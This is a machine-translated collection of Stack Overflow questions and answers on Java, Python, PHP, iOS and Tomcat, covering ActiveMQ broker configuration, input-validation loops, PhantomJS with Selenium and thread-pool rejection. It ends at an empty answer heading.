如何在spring上下文中配置多个远程activemq代理（不同的IP地址）？以下是 1 个远程代理的配置。我正在使用骆驼创建路由，这些路由在多个远程代理中的不同队列之间产生和使用消息。基于以下路由，系统如何知道每个队列属于哪个远程代理？

*   项目清单

    from("direct:start").to("activemq:queue:outgoingRequests")

*   项目清单

    from("activemq:queue:incomingOrders").to("log:Events?showAll=true").to("bean:jmsService")

1 个代理 org.camel.routes 的 Spring 上下文

```
<bean id="jmsConnectionFactory" class="org.apache.activemq.ActiveMQConnectionFactory">
    <property name="brokerURL" value="tcp://10.1.11.97:61616" />
</bean>

<bean id="pooledConnectionFactory"
    class="org.apache.activemq.pool.PooledConnectionFactory" init-
            method="start" destroy-method="stop">
    <property name="maxConnections" value="8" />
    <property name="connectionFactory" ref="jmsConnectionFactory" />
</bean>

<bean id="jmsConfig" class="org.apache.camel.component.jms.JmsConfiguration">
    <property name="connectionFactory" ref="pooledConnectionFactory"/>
    <property name="concurrentConsumers" value="10"/>
</bean>

<bean id="activemq" class="org.apache.activemq.camel.component.ActiveMQComponent">
    <property name="configuration" ref="jmsConfig"/>
</bean> 
```

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2012-11-08T11:36:03.413

只需添加更多具有不同名称的组件

```
<bean id="activemq" class="org.apache.activemq.camel.component.ActiveMQComponent">
   <property name="configuration" ref="jmsConfig"/>
</bean>

<bean id="activemq2" class="org.apache.activemq.camel.component.ActiveMQComponent">
   <property name="configuration" ref="myOtherJmsConfig"/>
</bean> 
```

然后只需使用名称：

```
<from uri="activemq:queue:MY.QUEUE"/><!-- get from "1st" ActiveMQ -->
<to uri="activemq2:queue:MY.QUEUE"/> <!-- put to same queue name on other ActiveMQ --> 
```

实际上，您可以随意称呼它们，例如“EuropeanMarketBroker”或任何合适的名称。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2017-01-09T15:02:15.060

I have been trying to achieve this with the difference that my spring configuration is not in xml. It is helpful to know that you can achieve the same outcome by using spring annotations in a few ways.

The key to achieving this is registering the component with the desired name. For example:

```
camelContext.addComponent("activemq2", jmsComponentInstance); 
```

There is two ways of achieving this. Namely by creating two beans with qualifiers which identifies them from each other and then wiring those beans and registering them as components. Alternatively (this is preferable) you can create the bean and register the component all at once. Below are examples of both:

1 - Create Bean and Register elsewhere

```
@Configuration
public class ClassA{    
  @Bean @Qualifier("activemq2") public JmsComponent createJmsComponent(){
      return JmsComponent.jmsComponentAutoAcknowledge(..);//Initialise component from externalised configs
  }
}

@Component
public class ClassB{

  @Autowired private CamelContext camelContext;

  @Autowired @Qualifier("activemq2")
  private JmsComponent jmsComponent;

  public void someMethod(){
    camelContext.addComponent("activemq2", jmsComponent);
  }
} 
```

2 - Create Bean and Register in one place within your @Configuration bean.

```
@Bean @Autowired public JmsComponent createJmsComponent(CamelContext camelContext){
    JmsComponent component = JmsComponent.jmsComponentAutoAcknowledge(..);//Initialise component from externalised configs
    camelContext.addComponent("activemq2", component);//Add Component to camel context
    return component;//Return component instance
} 
```

# python - Python循环错误检查

> ID：13287459
> 
> 赞同：0
> 
> 时间：2012-11-08T10:45:43.580
> 
> 标签：python, loops

我的程序需要一个数学输入并在继续之前检查它是否有错误，这是我需要帮助的代码部分：

```
expression= introduction()#just asks user to input a math expression    
operators= set("*/+-")
numbers= set("0123456789")
for i in expression:
    while i not in numbers and i not in operators:
        print("Please enter valid inputs, please try again.")
        expression= introduction() 
```

现在我已经设置了一个错误循环，但我遇到的问题是我不知道在这种情况下用什么来更新循环。任何人？

我需要一些简单的东西。我需要与此 OP 中发布的代码接近的东西。就像是：

```
expression= introduction()#just asks user to input a math expression    
operators= set("*/+-")
numbers= set("0123456789")
while True:
    for i in expression:
        if i not in numbers and i not in operators:
            print("Please enter valid inputs, please try again.")
            expression= introduction()
    else:
        break 
```

请注意，此代码也不起作用。它针对用户为“表达式”输入的每一个错误循环。

诸如以下内容之类的东西太高级了，我无法使用它们：

```
valid = operators | numbers
while True:
    expression = introduction()
    if set(expression) - valid:
        print 'not a valid expression, try again'
    else: 
        break 
```

* * *

```
import string

expression = introduction()    
operators = {'*', '/', '+', '-'}
numbers = set(string.digits)
while any(char not in numbers and char not in operators for char in expression):
    print("Please enter valid inputs, please try again.")
    expression = introduction() 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T11:00:47.853

您在第二个代码中非常接近。你需要做一些改变，你的代码应该是这样的： -

```
expression = ""
operators= set("*/+-")
numbers= set("0123456789")
while True:
    expression= introduction()  # You should read the next expression here
    for i in expression:
        if i not in numbers and i not in operators:
            print("Please enter valid inputs, please try again.")
            break # You should have a break here
    else:
        break

print expression  # Print if valid 
```

*   如果表达式无效，它只会跳出`for loop` 并继续`while`循环。
*   并且，如果表达式有效，它将执行`else block`你的`for-loop`并跳出 while 循环。
*   要`expression`在 while 循环之外使用，您需要在 while 循环之外声明它。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-08T11:02:40.707

如果您不能使用`all()`or `any()`，您可以测试包含错误的列表的长度：

```
if [c for c in expression if c not in operators|numbers]:
    # error 
```

没有`|`运算符：

```
if [c for c in expression if c not in operators and c not in numbers]:
    # error 
```

# android - xls 到 Android 中的 hashmap

> ID：13287466
> 
> 赞同：0
> 
> 时间：2012-11-08T10:45:57.700
> 
> 标签：android

有什么方法可以将我的带有两列的 xls 表转换为 hashmap？更具体地说，我有一个带有国家名称的表格和带有国家代码的列，我需要根据电话号码确定原产国。谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T10:54:23.803

您可以使用此 API：

[http://www.andykhan.com/jexcelapi/tutorial.html](http://www.andykhan.com/jexcelapi/tutorial.html)

你可以得到你想要的任何对象的数据。

# php - PHP CURL 和 ssl 认证基本

> ID：13287469
> 
> 赞同：0
> 
> 时间：2012-11-08T10:46:04.750
> 
> 标签：php, .net, ssl, curl, basic-authentication

我喜欢使用以下代码获取受基本身份验证和 ssl 保护的文件内容：

```
<?php

 $ch=curl_init();
 curl_setopt($ch,CURLOPT_URL,'https://webservicexxx.com:60443/services.asmx?WSDL');
curl_setopt($ch, CURLOPT_USERPWD, "MYLOGIN:MYPASSWORD");
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);   // no verify
 curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,5);
 curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
 $buffer = curl_exec($ch);
 curl_close($ch);

 print $buffer;

?> 
```

但结果，在我的屏幕上，我没有想要获取的文件内容，但我有这个页面：

```
Erreur HTTP 401.2 - Non autorisé : Accès refusé en raison de la configuration du serveur. 
```

这意味着，身份验证不起作用。我该怎么做才能获取文件的内容？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T23:17:10.950

curl 7.28.0 有一个已知的错误。请参阅[debian 错误报告](http://bugs.debian.org/cgi-bin/bugreport.cgi?bug=690551)

7.28.1 bugfix 发布也不是太远了。

# java - java中代码的编译时和运行时处理

> ID：13287470
> 
> 赞同：0
> 
> 时间：2012-11-08T10:46:07.250
> 
> 标签：java, runtime, compile-time

我有一段 Java 代码，我编译并运行了它。在再次编译和运行之前，我得到了一个输出并对其进行了一些更改。

与第二次编译相比，第一次编译所需的时间有什么不同。同样，第一个运行时到第二个运行时之间是否有变化？有没有办法找到处理时间的差异？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T10:57:03.523

根据您所做的更改，可能会有一定的差异。这取决于你的程序做了什么以及它现在做了什么，我想你可以理解这一点。

要检查时间，您可以通过在程序执行后创建一个可以充当计时器的线程来执行此操作，并在所有进程完成后停止该线程并简单地显示以查看时间。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-08T10:57:04.267

首先，我不确定为什么这对你很重要。也许通过提供更多上下文，您将获得更详细的答案。

可以使用操作系统工具来比较编译时间。例如，在 Linux 上尝试使用[**`time`**](http://linux.die.net/man/1/time).

您的两个 Java 程序的完整执行时间可以以相同的方式实现。但是，如果您更仔细地查看您的代码更改是否提高了您的执行性能，我建议您[谷歌“Java 中的基准测试”](https://www.google.co.uk/search?q=benchmarking+in+java)以查找有关对代码进行基准测试的*正确*方法的大量信息。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-08T11:00:01.163

如果您使用 Eclipse，您可以配置 Project -> Build Automatically 以在每次更改后重新构建项目。因此，一旦您想运行，它将花费最少的时间。

# java - 在 BIRT 中将两列相乘

> ID：13287478
> 
> 赞同：0
> 
> 时间：2012-11-08T10:46:35.077
> 
> 标签：java, eclipse, reporting, birt

我是 birt 报告工具的新手。在我的要求中，我通过查询调用 2 个函数（两个单独的数据集。即 dset2 和 dset3）产生 2 列。表绑定到另一个数据集（即：dset1）。现在我需要显示通过将这 2 列相乘，这 2 列与另一列一起。我该怎么做这个 BIRT？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-26T18:16:56.050

你没有说你使用的是哪个版本的BIRT，下面的答案使用4.2.1，但也应该适用于早期版本。

您已经创建了两个源数据集，下一步是创建一个连接数据集。

*   右键单击大纲中的“数据集”，然后选择“新建联合数据集”

连接两个数据集后，您可以创建计算列，将两列相乘。

您当然必须重新创建表并将其绑定到新连接的数据集。

# python - 有没有办法在 Python 中使用 PhantomJS？

> ID：13287490
> 
> 赞同：211
> 
> 时间：2012-11-08T10:46:54.207
> 
> 标签：python, phantomjs

我想在[Python中使用](http://www.python.org/)[PhantomJS](http://phantomjs.org/)。我用谷歌搜索了这个问题，但找不到合适的解决方案。

我觉得`os.popen()` 可能是个不错的选择。但我无法向它传递一些论据。

目前使用`subprocess.Popen()`可能是一个合适的解决方案。我想知道是否有更好的解决方案。

有没有办法在 Python 中使用 PhantomJS？

* * *

## 回答 #1

> 赞同：382
> 
> 时间：2013-03-29T08:23:16.483

在 python 中使用 PhantomJS 的最简单方法是通过 Selenium。最简单的安装方法是

1.  安装[NodeJS](https://nodejs.org/)
2.  使用 Node 的包管理器安装 phantomjs：`npm -g install phantomjs-prebuilt`
3.  安装 selenium （在你的 virtualenv 中，如果你正在使用它）

安装后，您可以像使用 phantom 一样简单：

```
from selenium import webdriver

driver = webdriver.PhantomJS() # or add to your PATH
driver.set_window_size(1024, 768) # optional
driver.get('https://google.com/')
driver.save_screenshot('screen.png') # save a screenshot to disk
sbtn = driver.find_element_by_css_selector('button.gbqfba')
sbtn.click() 
```

如果您的系统路径环境变量设置不正确，您需要指定确切的路径作为`webdriver.PhantomJS()`. 替换这个：

```
driver = webdriver.PhantomJS() # or add to your PATH 
```

...具有以下内容：

```
driver = webdriver.PhantomJS(executable_path='/usr/local/lib/node_modules/phantomjs/lib/phantom/bin/phantomjs') 
```

参考：

*   [http://selenium-python.readthedocs.io/](http://selenium-python.readthedocs.io/)
*   [如何在 python webdriver 中为 phantomjs/ghostdriver 设置代理？](https://stackoverflow.com/questions/14699718/how-do-i-set-a-proxy-for-phantomjs-ghostdriver-in-python-webdriver/15699530#15699530)
*   [https://dzone.com/articles/python-testing-phantomjs](https://dzone.com/articles/python-testing-phantomjs)

* * *

## 回答 #2

> 赞同：82
> 
> 时间：2012-11-08T10:49:59.110

PhantomJS 最近完全[放弃了对 Python 的支持](http://phantomjs.org/release-1.5.html)。但是，PhantomJS 现在嵌入了[Ghost Driver](https://github.com/detro/ghostdriver)。

一个新项目已经开始填补这一空白：[`ghost.py`](http://ghost-py.readthedocs.org/en/latest/). 您可能想改用它：

```
from ghost import Ghost
ghost = Ghost()

with ghost.start() as session:
    page, extra_resources = ghost.open("http://jeanphi.me")
    assert page.http_status==200 and 'jeanphix' in ghost.content 
```

* * *

## 回答 #3

> 赞同：40
> 
> 时间：2013-05-03T07:39:39.083

现在由于 GhostDriver 与 PhantomJS 捆绑在一起，通过 Selenium 使用它变得更加方便。

按照 Pykler 的建议，我尝试了 PhantomJS 的 Node 安装，但实际上我发现它比 PhantomJS 的独立安装要慢。我猜独立安装之前没有提供这些功能，但从 v1.9 开始，它非常提供。

1.  安装 PhantomJS ( [http://phantomjs.org/download.html](http://phantomjs.org/download.html) ) (如果你在 Linux 上，下面的说明会有所帮助[https://stackoverflow.com/a/14267295/382630](https://stackoverflow.com/a/14267295/382630) )
2.  使用 pip 安装 Selenium。

现在你可以像这样使用

```
import selenium.webdriver
driver = selenium.webdriver.PhantomJS()
driver.get('http://google.com')
# do some processing

driver.quit() 
```

* * *

## 回答 #4

> 赞同：8
> 
> 时间：2012-12-18T13:17:44.613

以下是我使用 PhantomJS 和 Django 测试 javascript 的方法：

**移动/test_no_js_errors.js**：

```
var page = require('webpage').create(),
    system = require('system'),
    url = system.args[1],
    status_code;

page.onError = function (msg, trace) {
    console.log(msg);
    trace.forEach(function(item) {
        console.log('  ', item.file, ':', item.line);
    });
};

page.onResourceReceived = function(resource) {
    if (resource.url == url) {
        status_code = resource.status;
    }
};

page.open(url, function (status) {
    if (status == "fail" || status_code != 200) {
        console.log("Error: " + status_code + " for url: " + url);
        phantom.exit(1);
    }
    phantom.exit(0);
}); 
```

**移动/tests.py**：

```
import subprocess
from django.test import LiveServerTestCase

class MobileTest(LiveServerTestCase):
    def test_mobile_js(self):
        args = ["phantomjs", "mobile/test_no_js_errors.js", self.live_server_url]
        result = subprocess.check_output(args)
        self.assertEqual(result, "")  # No result means no error 
```

**运行测试**：

`manage.py test mobile`

* * *

## 回答 #5

> 赞同：6
> 
> 时间：2017-03-06T08:46:49.553

[@Pykler](https://stackoverflow.com/a/15699761/963195)的答案很好，但 Node 要求已经过时了。该答案中的评论提出了更简单的答案，我把它放在这里是为了节省其他人的时间：

1.  安装 PhantomJS

    正如@Vivin-Paliath 指出的那样，它是一个独立的项目，而不是 Node.js 的一部分。

    苹果电脑：

    ```
    brew install phantomjs 
    ```

    Ubuntu：

    ```
    sudo apt-get install phantomjs 
    ```

    ETC

2.  设置一个`virtualenv`（如果你还没有）：

    ```
    virtualenv mypy  # doesn't have to be "mypy". Can be anything.
    . mypy/bin/activate 
    ```

    如果您的机器同时具有 Python 2 和 3，您可能需要 run`virtualenv-3.6 mypy`或类似的。

3.  安装硒：

    ```
    pip install selenium 
    ```

4.  [尝试一个简单的测试，就像从文档](http://selenium-python.readthedocs.io/getting-started.html#simple-usage)中借来的：

    ```
    from selenium import webdriver
    from selenium.webdriver.common.keys import Keys

    driver = webdriver.PhantomJS()
    driver.get("http://www.python.org")
    assert "Python" in driver.title
    elem = driver.find_element_by_name("q")
    elem.clear()
    elem.send_keys("pycon")
    elem.send_keys(Keys.RETURN)
    assert "No results found." not in driver.page_source
    driver.close() 
    ```

* * *

## 回答 #6

> 赞同：5
> 
> 时间：2013-05-20T22:40:09.963

这就是我所做的，python3.3。我正在处理大量的站点列表，因此超时失败对于整个列表的运行至关重要。

```
command = "phantomjs --ignore-ssl-errors=true "+<your js file for phantom>
process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE)

# make sure phantomjs has time to download/process the page
# but if we get nothing after 30 sec, just move on
try:
    output, errors = process.communicate(timeout=30)
except Exception as e:
    print("\t\tException: %s" % e)
    process.kill()

# output will be weird, decode to utf-8 to save heartache
phantom_output = ''
for out_line in output.splitlines():
    phantom_output += out_line.decode('utf-8') 
```

* * *

## 回答 #7

> 赞同：5
> 
> 时间：2016-09-14T17:51:12.527

如果使用 Anaconda，请安装：

```
conda install PhantomJS 
```

在你的脚本中：

```
from selenium import webdriver
driver=webdriver.PhantomJS() 
```

完美运行。

* * *

## 回答 #8

> 赞同：2
> 
> 时间：2014-09-23T14:04:15.507

如果您使用的是[Buildout](http://www.buildout.org/en/latest/)，您可以轻松地自动化 Pykler 使用[gp.recipe.node](https://pypi.python.org/pypi/gp.recipe.node)配方描述的安装过程。

```
[nodejs]
recipe = gp.recipe.node
version = 0.10.32
npms = phantomjs
scripts = phantomjs 
```

该部分将 node.js 安装为二进制文件（至少在我的系统上），然后使用 npm 安装 PhantomJS。最后，它创建了一个入口点`bin/phantomjs`，您可以使用它来调用 PhantomJS 网络驱动程序。（要安装 Selenium，您需要在 egg 需求或 Buildout 配置中指定它。）

```
driver = webdriver.PhantomJS('bin/phantomjs') 
```

# php - PHP include 似乎使页面将自身解释为目录

> ID：13287491
> 
> 赞同：1
> 
> 时间：2012-11-08T10:46:55.920
> 
> 标签：php, include, document-root

我有一个页面，`index.php`像这样（简化）：

```
<img src="content/banner.png"/> 
```

图像加载良好。但是当我包含某个（WordPress）脚本时，就像这样，

```
<img src="content/banner.png"/>
<?php
    include('template-loader.php');
?> 
```

图像不再加载！我还注意到浏览器中的 URL 变为`index.php/`.

这怎么可能？图像当然不会加载，因为我使用的是相对路径并且它正在寻找`index.php/content/banner.jpg`. 没错，我可以使用绝对路径来解决这个问题，但我想知道会发生什么以及如何在 PHP 中解决这个问题。

我正在本地`wamp`安装上进行测试，并禁用了所有`mod_rewrite`s 等，以确保它不是导致问题的外部因素。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T10:57:48.507

哦。发布几分钟后，我在脚本中找到了罪魁祸首：

```
/**
 * Loads the correct template based on the visitor's url
 * @package WordPress
 */
if ( defined('WP_USE_THEMES') && WP_USE_THEMES )
        do_action('template_redirect'); 
```

它正在做某种重定向；对此进行评论会使一切按预期工作。

我仍然不明白这个脚本如何神奇地重定向到`index.php/`好像它是一个目录（并让文档实际加载）但是......

*如果它似乎没有帮助任何人（基于观点和投票），我将来会删除这个问题。*

# java - ThreadPoolExecutor 修复了具有自定义行为的线程池

> ID：13287498
> 
> 赞同：8
> 
> 时间：2012-11-08T10:47:15.687
> 
> 标签：java, multithreading, threadpool, threadpoolexecutor

我是这个主题的新手......我正在使用用 Executors.newFixedThreadPool( 10 ) 创建的 ThreadPoolExecutor ，在池已满后，我开始收到 RejectedExecutionException 。有没有办法“强制”执行者将新任务置于“等待”状态，而不是在池被释放时拒绝它并启动它？

谢谢

关于这个 [https://github.com/evilsocket/dsploit/issues/159的问题](https://github.com/evilsocket/dsploit/issues/159)

涉及的代码行[https://github.com/evilsocket/dsploit/blob/master/src/it/evilsocket/dsploit/net/NetworkDiscovery.java#L150](https://github.com/evilsocket/dsploit/blob/master/src/it/evilsocket/dsploit/net/NetworkDiscovery.java#L150)

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2012-11-08T10:49:07.853

如果您使用`Executors.newFixedThreadPool(10);`它将任务排队，它们会等待线程准备好。

这种方法是

```
public static ExecutorService newFixedThreadPool(int nThreads) {
    return new ThreadPoolExecutor(nThreads, nThreads,
                                  0L, TimeUnit.MILLISECONDS,
                                  new LinkedBlockingQueue<Runnable>());
} 
```

如您所见，使用的队列是无限的（这本身可能是一个问题），但这意味着队列永远不会填满，您也永远不会被拒绝。

顺便说一句：如果您有 CPU 密集型任务，则最佳线程数可以是

```
int processors = Runtime.getRuntime().availableProcessors();
ExecutorService es = Executors.newFixedThreadPool(processors); 
```

* * *

一个可以说明情况的测试类

```
public static void main(String... args) {
    ExecutorService es = Executors.newFixedThreadPool(2);
    for (int i = 0; i < 1000 * 1000; i++)
        es.submit(new SleepOneSecond());

    System.out.println("Queue length " + ((ThreadPoolExecutor) es).getQueue().size());
    es.shutdown();
    System.out.println("After shutdown");
    try {
        es.submit(new SleepOneSecond());
    } catch (Exception e) {
        e.printStackTrace(System.out);
    }
}

static class SleepOneSecond implements Callable<Void> {
    @Override
    public Void call() throws Exception {
        Thread.sleep(1000);
        return null;
    }
} 
```

印刷

```
Queue length 999998
After shutdown
java.util.concurrent.RejectedExecutionException: Task java.util.concurrent.FutureTask@e026161 rejected from java.util.concurrent.ThreadPoolExecutor@3e472e76[Shutting down, pool size = 2, active threads = 2, queued tasks = 999998, completed tasks = 0]
    at java.util.concurrent.ThreadPoolExecutor$AbortPolicy.rejectedExecution(ThreadPoolExecutor.java:2013)
    at java.util.concurrent.ThreadPoolExecutor.reject(ThreadPoolExecutor.java:816)
    at java.util.concurrent.ThreadPoolExecutor.execute(ThreadPoolExecutor.java:1337)
    at java.util.concurrent.AbstractExecutorService.submit(AbstractExecutorService.java:132)
    at Main.main(Main.java:17) 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-11-08T11:08:03.653

很有可能一个线程调用`exit`，它设置`mStopped`为 false 并关闭执行程序，但是：

*   您正在运行的线程可能处于`while (!mStopped)`循环中间并尝试将任务提交给已被关闭的执行程序`exit`
*   返回 true中的条件，`while`因为所做的更改`mStopped`不可见（您不使用任何形式的围绕该标志的同步）。

我会建议：

*   使`mStopped`挥发性
*   处理在循环中间执行程序关闭的情况（例如通过捕获 RejectedExecutionException，或者可能更好：在您的 while 循环之后关闭执行程序，而不是在退出方法中关闭它）。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-09-25T13:31:58.133

基于之前的建议，您可以使用阻塞队列来构造一个固定大小的`ThreadPoolExecutor`。如果您随后提供自己的`RejectedExecutionHandler`将任务添加到阻塞队列中，它将按照描述的方式运行。

这是一个如何构建这样一个执行器的示例：

```
int corePoolSize    = 10;
int maximumPoolSize = 10;
int keepAliveTime   =  0;
int maxWaitingTasks = 10;

ThreadPoolExecutor blockingThreadPoolExecutor = new ThreadPoolExecutor(
        corePoolSize, maximumPoolSize,
        keepAliveTime, TimeUnit.SECONDS,
        new ArrayBlockingQueue<Runnable>(maxWaitingTasks),
        new RejectedExecutionHandler() {
            @Override
            public void rejectedExecution(Runnable r, ThreadPoolExecutor executor) {
                try {
                    executor.getQueue().put(r);
                } catch (InterruptedException e) {
                    throw new RuntimeException("Interrupted while submitting task", e);
                }
            }
        }); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2016-04-12T20:44:54.493

如果我理解正确，您的 ThreadPool 使用固定数量的线程创建，但您可能有更多任务要提交到线程池。我会根据请求计算 keepAliveTime 并动态设置它。这样你就不会有 RejectedExecutionException。

例如

long keepAliveTime = ((applications.size() * 60) / FIXED_NUM_OF_THREADS) * 1000; threadPoolExecutor.setKeepAliveTime(keepAliveTime, TimeUnit.MILLISECONDS);

其中应用程序是任务的集合，每次都可能不同。

如果您知道任务所需的平均时间，那应该可以解决您的问题。

# iphone - UIView 保存有关模型（业务对象）的信息有多糟糕

> ID：13287499
> 
> 赞同：1
> 
> 时间：2012-11-08T10:47:15.637
> 
> 标签：iphone, ios

这个问题是针对 iOS 开发的。

想象一下，您使用`UITableView`并在`UITableViewCells`其中通过我们将调用的更复杂的类显示有关您的一个或多个应用程序业务对象的信息`ComplexBOView`。

现在您想在用户点击包含在您的视图中的这个视图时触发一个特定的动作`UITableCellView`（该事件可以通过 a 触发`UITapGestureRecognizer`）

大多数时候，被认为是“最佳实践”的是使用 的`tag`属性`UIView`来实际返回您的模型并检索正确的业务对象。

这通常是合适的，但在某些情况下，保存指向用于构建您的`ComplexBOView`.

```
@interface ComplexBOView : UIView
{
    UILabel* lblSummary;
    // ....

    UITapGestureRecognizer* tapGesture;
    NSObject* businessObject_;
}

@property (nonatomic, readonly) UITapGestureRecognizer* tapGesture;
@property (nonatomic, assign) NSObject* businessObject; 
```

这背后的想法是，当用户点击视图时，实际上直接返回到 businessObject。

这里有两个问题

*   在 UIView 中有 NSObject* 信息真的很糟糕吗？
*   是否应该保留此信息，这意味着视图和模型之间的关系在这里变得更加牢固（视图对对象的所有权）？

谢谢你的建议。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T11:38:19.680

你应该坚持委托设计。您永远不知道何时可能需要代码方面的帮助，而人们希望使用委托。在我看来，这会使你的代码变得意大利面。

请记住，视图会被回收，尤其是在表格视图中。一旦视图看不见，它就会被重新使用，所以你放在那里的任何逻辑至少可以说维护起来很复杂

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-08T11:48:07.387

Trausti Thor 是对的。一旦你开始这种捷径，那就是一千次妥协的死亡（或者换句话说，技术债务只会堆积起来，直到它产生的代码库如此可怕，没有人愿意碰它，以防万一他们打破别的东西）。

每当您有机会做对时，第一次就做，因为有时商业或其他压力会迫使您不这样做，这些是不可避免的，但您希望通过做出妥协来尽量减少此类妥协的影响例外。

最后，如果它是一个例外，几乎是你代码上的一个污点，你可能会更倾向于在更安静的时间返回并修复它。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-08T12:32:16.040

一般建议是

> 视图不拥有数据！

这是一个很好的建议。从长远来看，它可以为您省去很多麻烦。但是**自己**是什么意思？如果您查看 a`UIButton`或 a `UILabel`，则该按钮具有`title`标签 a`text`属性。所以他们持有一些数据，他们必须 - 替代方案必须有一个代表，每次绘制时都被要求提供文本。

那么在你的情况下这意味着什么？那要看情况了。如果您`ComplexBOView`只是专门设计用于**显示**您的特定业务对象的通用视图，那么将该对象保存在它的属性中并不是最糟糕的（只是我的观点）。

当然，您失去了使用不同模型轻松重用该视图的可能性，但也许无论如何这不是一个选择，因为它是如此具体。当然，您可以将所有代码从`ComplexBOView`控制器移至控制器。但是正如您所说，您还必须在每个模型对象和适当的视图之间保持连接。（顺便说一句。我不会使用`tag`来做到这一点，最好只使用 `NSDictionary 代替）

另一方面，特劳西和迈克尔确实有有效的观点。如果你这一次打破了这个“规则”，你可能会在其他任何场合都松懈并打破它，在你意识到之前，你最终会得到很多自定义视图，每个视图都包含对模型某些部分的引用。从长远来看，您可能会对模型进行更改（可能以您一开始没想到的方式进行更改 - 相信我，这**会**经常发生）然后您必须去每个子类并调整它们. 当然，如果特定于模型的代码存在于您的控制器中，您还必须修改所有这些，但至少它们都在一个地方。

总而言之，这些最佳实践、建议和设计模式的存在是有充分理由的。它们在无数情况下证明自己是有用的。所以总的来说，你只要跟着他们就行了。然而，在某些情况下可能值得违反它们，但您必须有一些非常好的理由，并且您应该意识到后果。

归根结底，这是你的代码、你的设计、你的决定。也许你猜错了，但有些教训必须通过艰难的方式学习。下次你知道该怎么做，更重要的是，**为什么**。创造自己的经验总是很有价值的。

# java - tomcat使用哪个java版本

> ID：13287502
> 
> 赞同：14
> 
> 时间：2012-11-08T10:47:21.503
> 
> 标签：java, tomcat

我已设置`JAVA_HOME`为`C:\Program Files\Java\jdk1.5.0_11`
我已设置`Classpath`为`C:\Program Files\Java\jre1.5.0_11`

我已将路径设置为

`C:\Ruby193\bin;C:\XEClient\bin; F:\oracle\product\10.2.0\db_2\bin;%SystemRoot%\system32;%SystemRoot%;%SystemRoot%\System32\Wbem; C:\Program Files\Java\jdk1.6.0_17\bin; C:\Program Files\jEdit;C:\Program Files\TortoiseSVN\bin; C:\Program Files\Microsoft SQL Server\90\Tools\binn\`

现在我的问题是，`version`tomcat 在 java 上运行什么？
tomcat 控制台写下整个“路径”
，并`cmd`说它是当前在系统中运行的 java 版本 7。
有人请帮帮我.. 我的系统中安装了 java 5,6,7 版本，还有 tomcat 5,6,7。
现在tomcat的java版本和系统的java版本是什么？？？

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2012-11-08T11:13:02.580

您可以在默认安装的管理器应用程序中查看**Tomcat 实际运行的 Java 版本。**转到`http://hostname:8080/manager/html`（用主机名或本地主机替换主机名），滚动到底部，在那里你会找到“JVM 版本”。

**选择哪个 JVM 在**很大程度上取决于操作系统和安装方式，也许[http://tomcat.apache.org/tomcat-7.0-doc/setup.html](http://tomcat.apache.org/tomcat-7.0-doc/setup.html)会有所帮助。

例如，如果您**使用带有服务包装器的 Tomcat 运行 Windows**（我建议 Windows 这样做），您可以直接在托盘图标 -> 配置 Tomcat 中**设置 JVM 的路径。**在 Java 选项卡中，例如将 Java 虚拟机设置为“D:\java\jdk1.6.0_35\jre\bin\server\jvm.dll”（禁用“使用默认值”）或您的 JVM 所在的位置 -> 您需要指定jvm.dll 的完整路径。

关于了解**系统在哪个 Java 上运行**：这很难回答，实际上并没有一个系统运行的 Java 版本。例如，对于 Windows，可能在 PATH 中设置了一个 Java 版本，在 JAVA_HOME / JRE_HOME / ... 中可能设置了一个不同的版本，在注册表中设置了一个（或多个），在每个用于小程序的 Web 浏览器中活动的某个版本插件等. 你必须检查你感兴趣的部分。大多数好的Java应用程序都会在某处显示使用的版本，在日志中，关于对话框等等。对于 Firefox，您可以查看附加组件/插件列表。像 JSmooth 这样的 Java exe 包装器可以在不同的地方搜索 Java 并选择最合适的，例如最新的，不一定是最“暴露”的。

* * *

## 回答 #2

> 赞同：14
> 
> 时间：2015-04-10T01:12:20.917

如果您的服务器上没有管理器应用程序（我没有），那么您可以像这样检查它：

```
ps -ef | grep tomcat 
```

输出应该列出您正在运行的服务器：

```
tomcat     741     1 87 01:07 ?        00:01:15 /usr/java/default/bin/../bin/java ... 
```

现在您知道您的 java 在哪里执行了您的 tomcat，您可以检查以下版本：

```
/usr/java/default/bin/../bin/java -version 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2018-08-01T21:35:20.030

我发现这个命令很有帮助。从你的 tomcat 安装目录。

Linux

```
java -cp lib/catalina.jar org.apache.catalina.util.ServerInfo 
```

窗户

```
java.exe -cp lib\catalina.jar org.apache.catalina.util.ServerInfo 
```

样本输出

```
Server version: SpringSource tc Runtime/2.0.4.RELEASE
Server built: August 3 2010 0710
Server number: 6.0.28.29
OS Name: Linux
OS Version: 2.6.18-194.11.1.el5
Architecture: i386
JVM Version: 1.6.0_21-b06
JVM Vendor: Sun Microsystems Inc. 
```

参考[https://confluence.atlassian.com/confkb/how-to-determine-your-version-of-tomcat-and-java-331914173.html](https://confluence.atlassian.com/confkb/how-to-determine-your-version-of-tomcat-and-java-331914173.html)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-11-08T10:57:21.927

您可以通过更改 catalina.bat/catalina.sh 进行选择，除非您更改 setenv.bat，否则您的设置将使用 JAVA_HOME。

只需输入`java -version`您的 dos 提示符即可查看您的默认 Java 版本，除非您明确告诉它们不要使用，否则将使用哪些程序。

* * *

## 回答 #5

